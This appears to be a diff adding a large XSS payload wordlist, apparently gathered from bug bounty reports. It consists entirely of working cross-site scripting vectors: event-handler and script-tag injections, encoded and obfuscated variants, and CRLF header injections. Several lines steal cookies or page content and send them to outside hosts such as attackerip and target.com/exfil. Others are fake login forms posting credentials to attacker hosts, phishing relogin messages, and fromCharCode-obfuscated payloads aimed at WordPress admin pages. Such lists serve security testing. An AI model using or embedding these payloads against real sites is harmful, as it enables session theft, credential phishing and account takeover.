@@ -1,0 +1,646 @@
+![xss" onload=alert(1);//](a)
+" onclick="alert(1)
+" onfocus="alert('Stored XSS in SEO Name field')"  autofocus="true"
+" onmouseover="alert('Stored XSS in SEO Name field')"
+" onmouseover="confirm(document.domain)" a="
+" onmouseover=alert('xss') "
+" onmouseover=alert(1) "
+" ontouchstart="alert(document.domain)
+"'><img src=a onerror=confirm(2)>"><script>alert(1);</script><iframe onload=alert(97)>"><svg onload=alert(2);>"onmouseover="confirm(2);<input onfocus=prompt(1) autofocus>"--> </script><svg/onload=';alert(/XSSPOSED/);'>"
+"'><img src=x onerror=prompt(1)>
+"--><%2Fscript><svg%2Fonload%3D'%3Balert(document.domain)%3B'>
+"-alert(document.domain)-"
+"/><script>alert(1);</script>
+";alert("XSS in "+document.domain);//
+"<iframe/onload=eval(atob(location.hash.substring(1)))>"@calc.sh
+">&#60;"><img src=x onerror=prompt(document.domain)> img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>
+">&#60;img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>
+"><"<img src="x">%20%20> "<iframe src=a>%20<iframe>
+"><"><img src=x onerror=prompt(document.domain)> img src=x onerror=prompt(document.domain)>
+"><&#x2f;a><p><center><h1><strong>Important!<&#x2f;strong> Please go to target.com and relogin!<&#x2f;center><&#x2f;h1><&#x2f;p><!--
+"><IMG src=x onerror=prompt(1);>"">><marquee><img src=x onerror=confirm(3)></marquee>"/
+"><details onauxclick=x=prompt,x`${document.cookie}`></details>
+"><div onmouseover="alert('XSS');">Hello :)                                                                                                                            "><div onmouseover="alert('XSS');">Hello :)
+"><h1>XSS here
+"><iframe src="malware_frame.html">
+"><iframe src="malware_frame.html">/
+"><iframe src="malware_frame.html">/                                           malware_frame.html
+"><img src="x onerror=alert(document.cookie)>
+"><img src="x" onerror=alert(cookie)>.png
+"><img src=1 onerror=alert(document.domain)>
+"><img src=a onerror=alert(1)>123@sdf.com
+"><img src=x onerror=alert(1)>
+"><img src=x onerror=alert(1)><x y="
+"><img src=x onerror=alert(4)>
+"><img src=x onerror=alert(document.cookie);>
+"><img src=x onerror=alert(document.domain)>
+"><img src=x onerror=javascript:alert("xss")>"
+"><img src=x onerror=javascript:alert("xss2")>"
+"><img src=x onerror=prompt('XSS');>
+"><img src=x onerror=prompt(133)>
+"><img+src=z+onerror=console.log(
+"><marquee+width=1000+onauxclick=confirm(document.cookie)>XSS</marquee>
+"><marquee>XSS here
+"><script src=//u00f1.xyz>
+"><script src=http://attackerip/blind.js/>
+"><script src=https://target.com></script>
+"><script>alert('stored xss')<%2fscript>
+"><script>alert(0);</script>
+"><svg onload=alert(3);
+"><svg onload=alert(3);>
+"><svg onload=alert(3333333);
+"><svg onload=alert(5);>
+"><svg/onload=confirm(document.domain)>
+"><u>XSS Vulnerability</u><marquee+onstart='alert(document.cookie)'>XSS
+">TEST<img src=K onerror=prompt(document.domain)>
+">yvvdwf-label<form class='hidden gl-show-field-errors'><input title='<script>alert(document.domain)</script>'>
+"Security test link":javascript:alert(document.domain)
+"onmouseover="alert(document.domain)&#x2f;
+"x><img src=a onerror=alert(1)>
+"}');alert(document.domain);console.log('
+"}}</script><script>alert(1)</script>
+$$('iframe')[0].contentWindow.postMessage('{"message":"Shopify.API.setWindowLocation","data":"javascript:alert(document.domain);0[0]"}','*')
+%%{init: { 'fontFamily': '\"></style><img src=x onerror=alert(document.cookie)>'} }%%
+%(branch)s:alert(1);//https://
+%3Ca+href%3D%22%01java%03script%3Aconfirm%28document.domain%29%22%3EClick+to+execute%3Ca%3E%0D%0A
+%3d=%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3dTOP_OF_RECORD%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d&ATprogram=1&E=&fullname=nbfgkjaa'%22()%26%25<geeknik><ScRiPt%20>prompt(/XSS/)</ScRiPt>&glomf=1&glorf=1&numusers=xmkucffw&org=1&other=1&phone=555-666-0606&recType%21=-██████-&source=1&sponsorglomf=1&sponsorname=xmkucffw&sponsorphone=555-666-0606
+&#123;&#123;constructor.constructor('alert(document.domain)')()}}
+&#34;&#62;&#60;&#34;&#62;&#60;img src=x onerror=prompt(document.domain)&#62; img src=x onerror=prompt(document.domain)&#62;
+&lt;img src=x onerror=alert(1) "
+'"></script><img src=x onerror=alert(1)>{{'7'*7}}
+'"><div id="test"><head><base href="javascript://"/></head><body><a href="/. /, /' onmouseover=confirm(document.domain); abc=abc">TESTLINK
+'"><img src=x id=█████ onerror=eval(atob(this.id))>
+'"><img src=x onerror=
+'"><img src=x onerror=alert(1) x=y
+'"><img src=x onerror=alert(1)>
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+');alert('XSS
+');alert(document.location);//
+',row:1}));alert("xss in path");debugger;(({y:'1
+'-->">'>'"<script>prompt(document.domain)</script>;" f0r=TRUE
+'-alert(document.domain)-'
+';alert('chron0x');'
+'<script>alert(1)</script>'
+'div[id="\\uD83D\\uDC4D;alert(1)//"]'
+'javascript:alert\x28\x29'
+'onerror=%22alert%601%60%22testabcd))/
+)%3E&labelsString=%22%3E%3Cimg+src%3DX+onerror%3Dalert(document.domain)%3E
+);"> <a href="                     "><img src="                                   "></a>qwqw#check-tx-status
+);>.html                                                                        http://██████████.target.com/"><img+src=z+onerror=console.log(
+* <h1 onauxclick=confirm(document.domain)>RIGHT CLICK HERE
+- Logon to [target.com/careers/list/?city=...](                                                        ><script>alert('xss by pavanw3b')<%2fscript>fupaiiz&country=all&keywords=&subteam=all&team=all) on firefox.
+- change the filename to \"><img src=1 onerror=\"url=String['fromCharCode'](104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61)+encodeURIComponent(document['cookie']);xhttp=&#x20new&#x20XMLHttpRequest();xhttp['open']('GET',url,true);xhttp['send']();
+--><button/autofocus/onfocus=Function("confirm`1`")();//name="XSS
+.alert(1);
+/* Template Name: <script>confirm(document.cookie);</script> */
+/><svg src=x onload=confirm(document.domain);>
+0xd3adc0de%26lt;ScRiPt%26gt;alert(%27XSS%20Success!%27)%26lt;/sCripT%26gt;
+0xd3adc0de&lt;ScRiPt&gt;alert('XSS Success!')&lt;/sCripT&gt;
+0xd3adc0de<ScRiPt>alert('XSS Success!')</sCripT>
+1-> Visit https://target.com/live/login/?reset=x&username=xss%22%3E%3Cimg+src=x+onerror=alert(document.domain)%3E
+1-Go to             >.target.com/admin/authenticate?return_url=javascript:alert(100)//
+1.  "><img src=x onerror=alert("XSS")>
+1. Access                                                                          ]=admin&serendipity[adminModule]=entries&serendipity[adminAction]=editSelect&serendipity[filter][author]=1xx");alert(document.domain);// while being authenticated;
+1. Set your own username as "<img src=x onerror=alert(document.domain)> foo / bar"
+1. go to:                                                                                                                                                                                                                                                                                                                                                                                                                                                   ];prompt();var%20asd=[{%27foo%27:%27bar
+12. Select the plan create with the payload "/><svg/onload=prompt(document.domain)>
+1234567"><img src=a onerror=alert(1)>
+1<ScRiPt>alert(9639)</ScRiPt>
+2 - type the payload in the "First Name" input ```test";</script><script>alert(document.cookie)</script>
+2 . Put the payload as answer <img src=x onerror=alert(document.cookie)>
+2- When browsing here, `                                                                                                                                                                                                                                                                                                                                            ><svg/onload=alert(domain)>&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.ft&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163
+2- enter this javascript   code    "><script>alert(1);</script>     in  form field
+2.  "><img src=x onerror=alert(document.domain)>
+2. Enter this in the search: ``      -alert(0)-    ``or simply visit: ██████
+2. Now enter the below payload in the First name, last name, company name and title: data: "><img src="                         >/index.html?c=hemantsolo_xss" />
+2. visit it:             >:<port>/poc.html?x=${alert(1)}
+3-Put your street address xss payload (xss"><!--><svg/onload=alert(document.domain)>)
+3. Add the payload ?trg="><script>alert(1)</script>
+3. Capture the request on burp, change the payload on the █████████ field to "><script>alert("XSS by nagli")></script>
+3. Click the text button and inject : <iframe src="                 "></iframe>
+3. On the name, enter payload:  </script><svg onload=alert(document.domain)>
+3. On the name, enter payload: **"><img src=x onerror=alert(document.domain)>**
+4- So change the any member name with hunter"><svg/onload=alert(2)>
+4. Create any file but choose a different target branch (something like <script>alert(1)</script>
+4. in file upload upload any photo with payload file name : "><img src=x onerror=alert(document.cookie);.jpg
+5. At the end of the URL (at the end of the &so=&o=) write 1"><h1>DOM XSS by c0mbo</h1>
+5. Name the plan with this payload "/><svg/onload=prompt(document.domain)>
+5. You can place an XSS stored payload on the users profile in the first name field using ant" autofocus onfocus=prompt(1) x="
+6. Change the Style Name with <noscript><p title= "</noscript><img src=x onerror=alert(document.cookie)>">, check the checkbox next to Save Style, click Save Style.
+7. In **Calendar Name** type something like: **TEST<img src=K onerror={here goes js payload}>**
+8. In the **Name** field type something like this: ">TEST<img src=K onerror={here goes mad js code}>
+<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;https://target.com/oauth/authenticate?oauth_token=████████"></head></html>
+<![endif]-- onerror="<![endif]-->" onload="<img src=1 onerror='alert(1)' />">
+<%= sanitize '<noscript><p id="</noscript><script>alert(1)</script>"></noscript>' %>
+</TITLE><SCRIPT>alert("XSS By Rishail 2025");</SCRIPT>
+</h6><image/src/onerror=alert(document.cookie)>
+</script>"><img src=x onerror=alert(0)>
+</script><script src="//domain">
+</script><script src=/ñ.xyz>
+</script><script>alert(test)</script>
+</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=prompt(document.cookie)//>\x3e
+</title></head><html onmouseover=alert(2)>
+</title><script/src='https://target.com/hta3.js'>
+</title><svg/onload=alert(domain)>
+<<!<script>iframe src=javajavascriptscript:alert(document.domain)>
+<>javascript:alert(document.cookie);
+<Button href="javascript://%0aalert(document.domain)">XSS</Button>
+<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">'
+<a href="#" title=" target='abc' rel= onmouseover=alert(/XSS/) ">This is a PoC for a Stored XSS</a>
+<a href="accesskey=x onclick=alert(document .domain)//"></a>
+<a href="data:data:image/svg+xml,%3Csvg xmlns='                          ' onload='alert(88)'%3E%3C/svg%3E">test 5</a>
+<a href="javascript:alert(2)">test 1</a>
+<a href='javascript:alert(document.domain);'>Click Me</a>
+<a xlink:href="data:image/svg+xml,%3Csvg xmlns='                          ' onload='alert(88)'%3E%3C/svg%3E">test 6</a>
+<a xlink:href="javascript:alert(2)">test 2</a>
+<a+href="ja%0A%0Dvascript:alert(document.domain)">Click</a>
+<a><pre lang='f/" onerror=alert(1) onload=alert(1) '><code lang="wavedrom">xss</code></pre></a>
+<br/> <br/><br/><br/><br/><br/><marquee><p style="color:red;"><b>!!!!! IMPORTANT message from Nextcloud administrator !!!!!!</b></p></marquee><br/><br/> A security issue was found last night.<br/> <p style="color:green;">Please go to manually on <a><b>target.com</a></b> to reset your password.</p> <b><p style="color:red;">Thank you in advance for doing so as soon as possible. </p></b><br/><br/><i>The IT team.</i></b><br/><br/> <br/><br/><br/> <b><marquee><p style="color:red
+<form action=https://target.com/en-us/my/remind/index.html method=POST><input type=hidden name="token" value="a016902ceaeb6ae91c21302631fbbcfc"><input type=hidden name="SN" value="818198181891891981981981516518198198"><input type=hidden name="OrderId" value=""><input type=hidden name="Submit" value="Send+E-mail%0D%0A"><input type=hidden name="c" value="1&quot;&lt;!--&gt;&lt;Svg OnLoad=(confirm)(document.cookie)&lt;!--"><input type=submit value=XSS-Acronis></form>
+<form action=█████████/WaterControl/shefgraph-historic.cfm?sid=BL110 method=POST><input type=hidden name="fld_graphrslow" value="Y"><input type=hidden name="fld_graphrslow" value="N"><input type=hidden name="Submit" value="View Graph"><input type=hidden name="fld_from1" value="01/01/2020"><input type=hidden name="fld_to1" value="12/31/2020"><input type=hidden name="fld_displaytype" value="S"><input type=hidden name="fld_type1" value="Plot"><input type=hidden name="fld_frompor" value="1&quot;&lt;
+<h3>Please login to proceed</h3><form action=http://attackerIP>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
+<html onmouseover=alert(1)>
+<html> <img src = x onerror = alert (1)> </html>
+<html><script>alert(0)</script></html>
+<html><script>alert(document.domain)</script></html>
+<http://\<img\ style=\"display:none\"\ src=0\ onerror=\"alert(\'Uh\ oh\')\"\>>
+<i class=gl-show-field-errors><input title="<script>alert(document.domain)</script>"/></i>
+<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;
+<iframe id="x" name="x" border="0" frameborder="0" width="100" height="30" src="https://target.com/index.php/form/XDFrame"></iframe>
+<iframe onload="alert(██████)" style="display:none"></iframe>
+<iframe onload=alert(document.domail)>
+<iframe src="//target.com"></iframe>
+<iframe src='//target.com'></iframe>
+<iframe src=http://target.com/a/lz8DAkB/embed/embed?pub=true&ref=http%3A%2F%2Flocalhost%2Fembed.html&w=540></iframe>
+<iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,116,101,115,116,32,61,32,49,50,51,59,10,97,108,101,114,116,40,116,101,115,116,41,59])) width=0 height=0 style=display:none;></iframe>
+<iframe srcdoc="<img src=x onerror=alert(document.domain)>"></iframe>
+<iframe srcdoc>
+<iframe>
+<img Src="http://target.com/JPx2sV" onload=alert("PENTEST")>%20%20> "<iframe Src=a>%20<iframe>
+<img onerror>
+<img src%3dx onerror%3dalert(document.cookie>
+<img src="//u00f1.xyz/xss.swf">
+<img src="0" onerror="alert(0)">
+<img src="a:" onerror="var t=setTimeout;t(function(){var b=function(d){var x=new XMLHttpRequest;t(function(){eval(x.responseText)},2000);x.open('POST','https://target.com');x.send(d)};window.parent.postMessage(b(document.head.innerHTML),'*');},2000)"/>
+<img src="https://target.com/images/a-addblog.png" onload="alert()">
+<img src="https://target.com/u/99037623">
+<img src=%3d onerror%3dalert(document.cookie)
+<img src='x' onerror='alert(4)'
+<img src=0 onerror="alert(0)"/>
+<img src=1111111><img src=1111111><a href="javascript:alert&#40/1/&#41">axxx</a><svg></svg><img src=1>
+<img src=a >\"><iframe onload=alert('XSS')>
+<img src=http://target.com?q={HTML}>
+<img src=x onerror="fetch('https://target.com/exfil',{method:'POST',body:btoa(document.body.innerText)})">
+<img src=x onerror="location='https://target.com/drive-by-download'">
+<img src=x onerror='javascript:window.open("http://target.com")'></img>
+<img src=x onerror=alert(/Stored_XSS/)>
+<img src=x onerror=alert(1) "
+<img src=x onerror=alert(1)"
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onmouseover=alert(1)>
+<img/src/onerror=alert(document.domain)>
+<img/src="0"onerror="alert(0)">
+<img/src='x'/onerror=alert(document.domain)>
+<img/src=x onerror=alert(1)>
+<img/src=x onerror=alert(document.domain)>
+<img>
+<input type="hidden" name="SAMLResponse" value="&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;&apos;XSS&apos;&#41;&gt;" />
+<input type="hidden" name="apellido" value="<script>alert()</script>" />
+<input type="hidden" name="first&#95;name" value="test";</script><script>alert(document.cookie)</script>" />
+<input type="hidden" name="loopState&#91;moduleId&#93;" value="&lt;svg&gt;&lt;script&gt;prompt&amp;&#35;40&#59;document&#46;domain&#41;&lt;&#47;script&gt;" />
+<input type="hidden" name="mail&#95;to&#95;first&#95;name" value="test&quot;&#59;&lt;&#47;script&gt;&lt;script&gt;alert&#40;&quot;HACKED&#32;BY&#32;Sleep&#32;NOt&#32;Found&quot;&#41;&lt;&#47;script&gt;" />
+<javascript:alert(document.cookie);>
+<javascript:alert(document.cookie)>
+<line onload="alert(2)" fill="none" stroke="#000000" stroke-miterlimit="10" x1="119" y1="84.5" x2="454" y2="84.5"/>
+<link rel="canonical" href="https://target.com/htp8bi2zcg" accesskey="x" onclick="confirm`1`" 2injectiontrme47nbfq="" blonde="" bright-sky-blend="" ground="1&quot;">
+<marquee loop%3d1 width%3d0 onfinish%3dco\u006efirm(document.cookie)>XSS<%2fmarquee>
+<math><mtext><table><mglyph><style><img src=x onerror=alert()></style>
+<math><style><img src=x onerror=alert(1)></style></math>
+<member><name>file</name><value>ccc'&gt;test&lt;img src=x onerror=alert('xss') onload=alert('xss')&gt;</value></member>
+<meta name="author" content="Evil &lt;script nonce=%READER-TITLE-NONCE%&gt;alert(document.location);&lt;/script&gt;!--">
+<object type="text/x-scriptlet" data="https://target.com/scriptlet.html"></object>
+<option><style></option></select><img src=x onerror=alert(1)></style>
+<p>These are not the payloads you're looking for... </p><script>console.error('Stored XSS, browser:', navigator.appVersion)</script>
+<script
+<script src="http://<adversery_domain>/payload.js"></script>
+<script src='$Value'>
+<script src=//u00f1.xyz>
+<script src=alert.js></script
+<script>
+<script></script>
+<script>[...something...]</script>
+<script>alert('AppleBois');</script>
+<script>alert('Javascript is executed.')</script>
+<script>alert('XSS');</script>
+<script>alert('XSS')</script>
+<script>alert('xss')</script>
+<script>alert()</script>
+<script>alert(0)</script>
+<script>alert(1);//
+<script>alert(1);</script>
+<script>alert(1)</script>
+<script>alert(2);</script>
+<script>alert(`xss!`)</script>
+<script>alert(document.cookie);</script>
+<script>alert(document.domain)</script>
+<script>debugger</script>
+<script>document.write(document.cookies)</script>
+<script>history.pushState('', '', '/')</script>
+<script>let a = `<%= j '${alert()}' %>`</script>
+<script>let a = `<%= j '`+alert`' %>`</script>
+<select><style><script>alert("XSS")</script></style></select>
+<select><style><script>alert(1)</script></style></select>
+<span class="s1">'<a href="<a href=" https:="" target.com="" gems="" "="">https://target.com/gems/</a><img src="" onerror="alert(location)">" rel="nofollow noreferrer noopener" target="_blank"&gt;&lt;img/src/onerror=alert(location)&gt;'</span>
+<span data-reactid=".255dmgqjchs.1.1.1.2.1.0.0">You searched for <strong>secalert"/><marquee onstart=alert(document.domain)></strong>.</span>
+<style><img/src="0"onerror="alert(0)"></style>
+<svg ... onload="alert('SIKN')">...</svg>
+<svg onload="">
+<svg onload="var req = new XMLHttpRequest(); req.open('GET', 'https://target.com/admin', false); req.setRequestHeader('Upgrade-Insecure-Requests', '1');req.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36') ;req.send(null);var headers = req.response.toLowerCase();console.log(headers);" xmlns="http://evil.com/2000/svg" xmlns:xlink="http://evil.com/1999/xlink" version=
+<svg onload=alert(document.domain)>
+<svg onload=eval(name)></svg>
+<svg onload>
+<svg width="256" height="128" version="1.1" viewBox="0 0 256 128" xmlns="http://target.com/2000/svg"><g fill="none" stroke-width="22"><circle cx="40" cy="64" r="26" stroke="#fff"/><foreignObject class="node" x="0" y="0" width="600" height="600"><div xmlns="http://target.com/1999/xhtml"><p>Login</p><form action="//evil.test"><input placeholder="Username" type="text"/><br/> <input placeholder="Password" type="text" /><br/><input type="submit" value="Login" /></form></div></foreignObject><circle al
+<svg/onload=alert("XSS") >
+<svg/onload=alert(document.cookie)>abcdef@test.com
+<svg/onload=confirm(document.cookie)>
+<svg/onload=confirm(document.domain)>
+<svg>
+<svg><!--?php "--><script>confirm(20)</script>?&gt;</svg>
+<svg><style><img/src="0"onerror="alert(0)"></style></svg>
+<svg><style><script>alert(1)</script></style></svg>
+>                                                                                       '%20onmouseover=alert('jarvis7')%20'
+> "><img src=/ onerror="alert(location.host)"
+> <img src=x onerror=prompt(document.domain)>
+><img src="X" onerror=top[8680439..toString(30)](1337+document.cookie)>
+?callback=alert(/xss/);//
+?redirect_to=javascript:alert("XSS")
+?█████=';}alert("chron0x"); function clickit(){//
+Address.AddressName=bbbbb%22%3E&Address.FirstName=z%22 onmouseover="alert('Hackerone')" style="position:fixed;left:0;top:0;width:9999px;height:9999px;">&Address.LastName=bbbbb%22%3E&Address.Country=US&Address.AddressLine1=bbbbb%22%3E&Address.AddressLine2=aaaa%22%3E&Address.City=aaaa%22%3E&Address.CountrySubdivision=AK&Address.PostalCode=75000&Address.PhoneNumber=███████&Address.PhoneExtension=&Address.AddressType=Registration&Address.AddressId=32ecef14-f8af-4b5e-adad-d8d2adc8ddad&Address.Verific
+Address=███████&Address2=█████&AeonForm=Registration&City=██████&Country=████&Department=Candidate&EMailAddress=█████████&FORMSTATE=1&FirstName=ghovjnjv&ID=1&IDType=1&LastName=ghovjnjv&NotificationMethod=Email&Password1=u]H[ww6KrA9F.x-F&Password2=u]H[ww6KrA9F.x-F&Phone=███&SAddress=██████&SAddress2=█████████&SCity=██████&SCountry=AF&SState=N/A&SZip=██████████&State=N/A&Status=USMA&SubmitButton=Submit%20Information&Username=ghovjnjv'"()%26%25<zzz><ScRiPt>alert(233)</ScRiPt>&Zip=██████████
+Browse to                                                                 "a='http%3a%2f%2f███';b='%3Fcookie=';c=btoa(document.cookie);window.open(a%2bb%2bc)">
+Dinosaurs secret life<img src=x  onerror=alert(1)>.png
+GET /login.php/styles<isindex%20type=image%20src=1%20onerror=chor4o(9939)>/"><BODY%20ONLOAD=alert(0x000123)>/local.css HTTP/1.1
+Go to                                     "><details%00open%00ontoggle=alert()>
+Hi, Admin<img src=K onerror=prompt(document.location) width=1px height=1px>
+JavaScript::SubClassName.function_name
+Meteor.call('createChannel', 'valid-name', [], false, {}, { name: 'edit me <img src onerror=alert(origin)>' })
+Post data: "><img src="                    >/zomato.php?c=zomato_xss" />
+Question ignore "-alert(document.domain)-"?
+SAMLResponse="><svg/onload=alert('xss')>
+SAMLResponse=%22%3E%3Csvg/onload=alert(/2XUkWJ29OE88uyTbdZ3a2UmA828/)%3E
+Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Domain=.target.com; Path=/; Secure;
+Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Max-Age=99999999; Domain=.target.com; Path=/; Secure; SameSite=Lax
+Test <img src=x onerror=alert(2)>
+Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>
+TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;
+This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,101,119,95,115,105,116,101,95,116,105,116,108,101,32,61,32,39,72,65,67,75,69,68,39,59,10,108,101,116,32,110,101,119,95,115,105,116,101,95,100,101,115,99,114,105,112,116,105,111,110,32,61,32,39,118,105,97,32,88,83,83,39,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,
+This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,97,109,101,32,61,32,112,97,114,101,110,116,46,66,80,95,78,111,117,118,101,97,117,46,109,101,115,115,97,103,101,115,46,114,111,111,116,85,114,108,46,115,112,108,105,116,40,39,47,39,41,91,50,93,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,109,101,109,98,101,114,115,47,39,32,43,32
+This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,101,100,105,116,46,112,104,112,63,117,115,101,114,95,105,100,61,50,38,119,112,95,104,116,116,112,95,114,101,102,101,114,101,114,61,47,119,112,45,97,100,109,105,110,47,117,115,101,114,115,46,112,104,112,39,5
+XSS Payload:  "><img src=x onerror=javascript:alert(document.cookie)>
+XSS Payload: "><img src=x onerror=javascript:alert(document.cookie)>
+XSS[JaVaScriPt:alert(1)] <-- click to test
+YUI.namespace('Env.DATA').consumer = {"uuid":"</script><script src=//target.com/z0i2sU>","firstName":null,
+[ ](http://a?p=[[/onclick=alert(0) .]])
+["search","","target/search_md.html","","<p><img/src=\".\"/onerror=alert(\"search\")>\n"]
+[<img/src="."/onerror=alert("search")>](a)
+[XSS](.alert(1);)
+[[constructor.constructor('alert(document.cookie)')()]]
+[clickme](vbscript:alert(document.domain))
+[code]javascript://%0dalert%28document.cookie%29[/code]
+[dailymotion id=x8oma9"><svg/onload=prompt(document.domain)>]
+[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
+[url=target.com:/onclick='alert(document.domain)'[url=]]xss[/url]
+[wpvideo%20w0MiG12Exx1\"><svg/onload=prompt(document.domain)>]
+[{\"type\":\"h1\",\"text\":\"asd>\\\"'<img src=a onerror=alert(document.domain)>\"}]
+\%2e%2e\%2e%2e\%2e%2e\comments_dal\users\getGlobalLoginSettings%2ejson?callback=alert(%2fxss%2f);%2f%2f
+\u0022\u003e\u003cimg src=x onerror=alert(1)\u003e\u003cx y=\u0022
+\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
+\x[\<script>alert(1);</script>\]
+]=alert(document.domain)
+__e2e_action_id=',alert(),'
+_qf__install-db-form=&action=database&moreFieldsShown=&dbName=something<script>alert('xss');</script>&dbUser=root&dbPassword=roots&dbHost=localhost&dbType=mysql&dbLocal=0&dbPort=3306&dbTableType=MYISAM&dbTablePrefix=rv_&save=Continue+%C2%BB
+`<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "                                                "><svg onload="alert(1)" xmlns="                          ">
+a'"><h1
+a:1:{s:34:"<script>alert('test')</script>test";a:1:{s:7:"expires";i:1893456000;}}
+alert('Hello: ' + window.parent.location.href);
+alert('XSS execution on: localhost:8080')
+alert('script')
+alert()
+alert(0)
+alert(1)
+alert(XSS)
+alert(document.domain)
+am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipboardData());</script>'
+astNode.operator='(window.X?void0:(window.X=true,prompt(document.domain)))+';
+bash$ touch '"><svg onload=alert(3);>'
+confirm('XSS')\
+copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x onerror=alert()&gt;&lt;/style&gt;XSS POC&quot;}"></div>me
+curl "http://localhost:3000" -H 'User-Agent: <script>alert("XSS")</script>' > poc.html
+curl "https://target.com/content/search.php?PHPSESSID=\">XSSHERE<script>alert(1)</script>"|grep XSS
+document.cookie
+document.domain
+emailbody=0xd3adc0de%26lt;ScRiPt%26gt;alert(%27XSS%20Success!%27)%26lt;/sCripT%26gt;
+fld_displaytype=S"%20accesskey%3d"X"%20onclick%3d"alert('XSS Success!')
+foo style=animation-name:gl-spinner-rotate onanimationend=alert(1)
+foo"><script src=//target.com/2.js></script><x=".com
+for (var i = 0; i < 15; i++) {document.cookie = `X${i}=${'X'.repeat(1000)}; max-age=86400; path=/cookie_bridge/retrieve`}
+gem '<img/src/onerror=alert(location)>', '2'
+http://...?payload=something="something"><img src="/nonexistent" onerror="alert(1)"><div class
+http://127.0.0.1:6060/%22%3E%3Csvg%20onload=alert(5);%3E/
+http://172.98.67.89:22057/survey.cgi?iface=%22%3E%3Cimg%20src=x%20onerror=prompt(document.cookie
+http://95.213.191.146/r.php?url=http%3A%2F%2Fevil.com%2Fproduct-category%2Fwoocommerce-extensions%2F%3F%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://\<img\
+http://javascript:alert(1)
+http://localhost:3000/#&lt;img/src/onerror=alert('xss')&gt;
+http://localhost:3000/vuln?redirect_url=javascript:alert()%08
+http://localhost:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1
+http://target.com/%0a<body
+http://target.com/%0a<script
+http://target.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
+http://target.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
+http://target.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
+http://target.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+http://target.com/JPBC/login.hbc?lang=%3C/SCRIPT%3E%3CSCRIPT%3Ealert(document.domain);%3C/SCRIPT%3E
+http://target.com/admin/campaign-zone-zones.php?_=&clientid=1&campaignid=1&status=available%22%3E%3Cimg%20src=1%20onerror=alert(document.domain)%3E&text=
+http://target.com/admin/stats.php?entity=global&breakdown=affiliates&statsBreakdown=day%27%20onclick=alert(document.domain)%20accesskey=X%20
+http://target.com/admin/stats.php?statsBreakdown=day&listorder=key&orderdirection=up&day=&setPerPage=15%27%20onclick=alert(document.domain)%20accesskey=X%20&entity=global&breakdown=history&period_preset=last_month&period_start=01+December+2020&period_end=31+December+2020
